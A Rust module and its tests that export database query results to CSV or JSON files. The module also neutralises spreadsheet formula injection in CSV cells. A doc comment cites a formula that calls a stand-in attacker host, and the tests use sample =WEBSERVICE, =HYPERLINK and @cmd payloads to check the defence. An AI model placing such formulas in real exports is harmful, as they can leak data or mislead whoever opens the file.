//! Writes a query result to a file as CSV or JSON, chosen by extension.

use saya_types::QueryResult;
use serde::ser::{Serialize, SerializeMap, Serializer};
use std::path::Path;

/// Writes `result` to `path`. Format is chosen by extension: `.csv` or `.json`.
pub(crate) fn write_result(result: &QueryResult, path: &Path) -> Result<usize, String> {
    let ext = path
        .extension()
        .and_then(|s| s.to_str())
        .map(|s| s.to_lowercase());
    match ext.as_deref() {
        Some("csv") => export_csv(result, path),
        Some("json") => export_json(result, path),
        _ => Err("unsupported export format; use a .csv or .json path".into()),
    }
}

fn normalize_row(row: &serde_json::Value, col_count: usize) -> Vec<serde_json::Value> {
    let mut cells = match row {
        serde_json::Value::Array(arr) => arr.clone(),
        scalar => vec![scalar.clone()],
    };
    cells.resize(col_count, serde_json::Value::Null);
    cells
}

fn cell_to_csv_string(value: &serde_json::Value) -> String {
    match value {
        serde_json::Value::Null => String::new(),
        serde_json::Value::String(s) => s.clone(),
        other => other.to_string(),
    }
}

/// Prefixes spreadsheet-formula-looking cells so opening the export in Excel
/// or LibreOffice cannot execute them (`=WEBSERVICE("http://attacker/")`).
/// Numeric values that merely start with `+`/`-` are left untouched.
fn neutralize_formula(field: &str) -> String {
    let trimmed = field.trim_start();
    let risky = match trimmed.chars().next() {
        Some('=') | Some('@') => true,
        Some('+') | Some('-') => trimmed[1..].trim().parse::<f64>().is_err(),
        _ => false,
    };
    if risky {
        format!("'{field}")
    } else {
        field.to_string()
    }
}

fn escape_csv_field(field: &str) -> String {
    if field.contains(',') || field.contains('"') || field.contains('\r') || field.contains('\n') {
        format!("\"{}\"", field.replace('"', "\"\""))
    } else {
        field.to_string()
    }
}

fn export_csv(result: &QueryResult, path: &Path) -> Result<usize, String> {
    let col_count = result.columns.len();
    let header = result
        .columns
        .iter()
        .map(|c| escape_csv_field(&neutralize_formula(c)))
        .collect::<Vec<_>>()
        .join(",");
    let mut lines = vec![header];
    for row in &result.rows {
        let cells = normalize_row(row, col_count);
        let line = cells
            .iter()
            .map(|cell| escape_csv_field(&neutralize_formula(&cell_to_csv_string(cell))))
            .collect::<Vec<_>>()
            .join(",");
        lines.push(line);
    }
    let content = lines.join("\n") + "\n";
    std::fs::write(path, content).map_err(|e| format!("failed to write CSV file: {e}"))?;
    Ok(result.rows.len())
}

struct JsonRow<'a> {
    columns: &'a [String],
    cells: &'a [serde_json::Value],
}

impl Serialize for JsonRow<'_> {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        let mut object = serializer.serialize_map(Some(self.columns.len()))?;
        for (column, cell) in self.columns.iter().zip(self.cells) {
            object.serialize_entry(column, cell)?;
        }
        object.end()
    }
}

fn export_json(result: &QueryResult, path: &Path) -> Result<usize, String> {
    let col_count = result.columns.len();
    let rows = result
        .rows
        .iter()
        .map(|row| normalize_row(row, col_count))
        .collect::<Vec<_>>();
    let objects = rows
        .iter()
        .map(|cells| JsonRow {
            columns: &result.columns,
            cells,
        })
        .collect::<Vec<_>>();
    let json_str = serde_json::to_string_pretty(&objects)
        .map_err(|e| format!("failed to serialize JSON: {e}"))?;
    std::fs::write(path, json_str).map_err(|e| format!("failed to write JSON file: {e}"))?;
    Ok(result.rows.len())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_write_result_csv_and_json() {
        let result = QueryResult {
            columns: vec!["id".to_string(), "name".to_string()],
            rows: vec![json!([1, "alice"]), json!([2, "bob, jr"])],
            row_count: 2,
            truncated: false,
            executed_sql: "SELECT * FROM users".to_string(),
        };

        // CSV test
        let mut csv_path = std::env::temp_dir();
        csv_path.push("saya_test_export_unique_123.csv");
        let count = write_result(&result, &csv_path).unwrap();
        assert_eq!(count, 2);
        let csv_content = std::fs::read_to_string(&csv_path).unwrap();
        let _ = std::fs::remove_file(&csv_path);
        assert!(csv_content.contains("id,name"));
        assert!(csv_content.contains("\"bob, jr\""));

        // JSON test
        let mut json_path = std::env::temp_dir();
        json_path.push("saya_test_export_unique_123.json");
        let count = write_result(&result, &json_path).unwrap();
        assert_eq!(count, 2);
        let json_content = std::fs::read_to_string(&json_path).unwrap();
        let _ = std::fs::remove_file(&json_path);
        let parsed: Vec<serde_json::Value> = serde_json::from_str(&json_content).unwrap();
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0]["id"], 1);
        assert_eq!(parsed[0]["name"], "alice");
        assert_eq!(parsed[1]["id"], 2);
        assert_eq!(parsed[1]["name"], "bob, jr");

        // Unsupported extension test
        let mut txt_path = std::env::temp_dir();
        txt_path.push("saya_test_export_unique_123.txt");
        let err = write_result(&result, &txt_path).unwrap_err();
        assert_eq!(err, "unsupported export format; use a .csv or .json path");
    }

    #[test]
    fn json_export_preserves_duplicate_column_labels_and_values() {
        let result = QueryResult {
            columns: vec!["name".to_string(), "name".to_string()],
            rows: vec![json!(["first", "second"])],
            row_count: 1,
            truncated: false,
            executed_sql: "SELECT first AS name, second AS name".to_string(),
        };
        let path = std::env::temp_dir().join("saya_test_export_duplicate_labels.json");

        write_result(&result, &path).unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        let _ = std::fs::remove_file(&path);

        assert!(serde_json::from_str::<serde_json::Value>(&content).is_ok());
        assert_eq!(content.matches("\"name\"").count(), 2);
        assert!(content.contains("\"name\": \"first\""));
        assert!(content.contains("\"name\": \"second\""));
    }

    #[test]
    fn csv_export_neutralizes_and_quotes_formula_shaped_aliases() {
        let result = QueryResult {
            columns: vec!["=HYPERLINK(\"http://x\",\"click\")".to_string()],
            rows: vec![json!(["safe"])],
            row_count: 1,
            truncated: false,
            executed_sql: "SELECT value AS \"=HYPERLINK(\\\"http://x\\\",\\\"click\\\")\""
                .to_string(),
        };
        let path = std::env::temp_dir().join("saya_test_export_formula_alias.csv");

        write_result(&result, &path).unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        let _ = std::fs::remove_file(&path);

        assert_eq!(
            content.lines().next(),
            Some("\"'=HYPERLINK(\"\"http://x\"\",\"\"click\"\")\"")
        );
    }
}

#[test]
fn formula_like_cells_are_neutralized_numbers_are_not() {
    assert_eq!(
        neutralize_formula("=WEBSERVICE(\"http://x/\")"),
        "'=WEBSERVICE(\"http://x/\")"
    );
    assert_eq!(neutralize_formula("@cmd arg"), "'@cmd arg");
    assert_eq!(neutralize_formula("-5"), "-5");
    assert_eq!(neutralize_formula("+42"), "+42");
    assert_eq!(neutralize_formula("-3.14e2"), "-3.14e2");
    assert_eq!(neutralize_formula("plain text"), "plain text");
    assert_eq!(neutralize_formula(""), "");
}
